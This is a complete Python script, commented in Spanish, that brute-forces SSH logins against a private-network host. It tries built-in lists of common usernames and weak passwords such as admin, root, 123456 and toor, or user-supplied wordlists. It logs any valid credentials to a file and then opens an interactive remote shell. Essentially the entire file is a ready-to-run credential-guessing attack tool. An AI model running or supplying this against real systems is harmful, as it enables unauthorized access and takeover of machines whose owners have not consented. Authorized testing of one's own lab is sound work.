#!/usr/bin/env python3
"""
SSH Probe - configurado para 192.168.10.11
"""
import sys
import time
import paramiko
import os

# --- Corrección para Windows ---
if os.name == 'nt':
    import msvcrt
else:
    import select

# ---------- CONFIG ----------
HOST_DEFAULT = "192.168.10.11"     # ⬅ SOLO CAMBIÉ ESTO
TIMEOUT = 6
DELAY_ENTRE_INTENTOS = 1.5
LOG_FILE = "probe.log"

USERS_DEFAULT = ["admin", "root", "ubuntu", "test", "user"]
PASSWORDS_DEFAULT = ["admin", "1234", "123456", "password", "root", "toor"]

def log(msg):
    print(msg)
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(msg + "\n")
    except Exception:
        pass

def pedir_datos():
    host = sys.argv[1] if len(sys.argv) >= 2 else HOST_DEFAULT
    if len(sys.argv) == 4:
        with open(sys.argv[2]) as f:
            users = [x.strip() for x in f if x.strip()]
        with open(sys.argv[3]) as f:
            pws = [x.strip() for x in f if x.strip()]
    else:
        print(f"[i] Usando listas por defecto contra {host} (incluye admin/admin).")
        users = USERS_DEFAULT
        pws = PASSWORDS_DEFAULT
    return host, users, pws

def probar(host, user, password):
    cli = paramiko.SSHClient()
    cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        cli.connect(
            hostname=host, username=user, password=password,
            timeout=TIMEOUT, banner_timeout=TIMEOUT, auth_timeout=TIMEOUT,
            allow_agent=False, look_for_keys=False,
        )
        return cli
    except paramiko.AuthenticationException:
        return None
    except Exception as e:
        log(f"   [!] error de red con {user}:{password} -> {e}")
        return None

def shell_interactiva(cli, user, host):
    log(f"\n[+] Conectado como '{user}' a {host}")
    log("[i] Ya podés trabajar. Escribí 'exit' para cerrar la sesión.\n")

    chan = cli.invoke_shell()
    chan.settimeout(0.0)

    try:
        while True:
            if chan.recv_ready():
                sys.stdout.write(chan.recv(4096).decode(errors="ignore"))
                sys.stdout.flush()

            if os.name == 'nt':
                if msvcrt.kbhit():
                    char = msvcrt.getch()
                    chan.send(char)
                    if char == b'\r':
                        chan.send(b'\n')
            else:
                r, _, _ = select.select([sys.stdin], [], [], 0.1)
                if r:
                    linea = sys.stdin.readline()
                    if not linea:
                        break
                    chan.send(linea)

            if not chan.active:
                break

    except KeyboardInterrupt:
        pass
    finally:
        cli.close()
        log("\n[*] Sesión cerrada.")

def main():
    log(f"\n===== SSH Probe iniciado {time.strftime('%Y-%m-%d %H:%M:%S')} =====")
    host, users, pws = pedir_datos()
    total = len(users) * len(pws)
    intento = 0
    encontrado = None

    log(f"\n[*] Probando {total} combinaciones contra {host}...\n")

    for user in users:
        for pwd in pws:
            intento += 1
            print(f"[{intento}/{total}] Probando {user}:{pwd}", end=" ... ", flush=True)
            cli = probar(host, user, pwd)
            if cli:
                print("OK ✅")
                log(f"[+] VÁLIDO: {user}:{pwd}")
                encontrado = (cli, user)
                break
            else:
                print("no")
            time.sleep(DELAY_ENTRE_INTENTOS)
        if encontrado:
            break

    if not encontrado:
        log("\n[-] No hubo credenciales válidas.")
        input("Presioná ENTER para salir...")
        return

    cli, user = encontrado
    shell_interactiva(cli, user, host)
    input("\nPresioná ENTER para salir del programa...")

if __name__ == "__main__":
    main()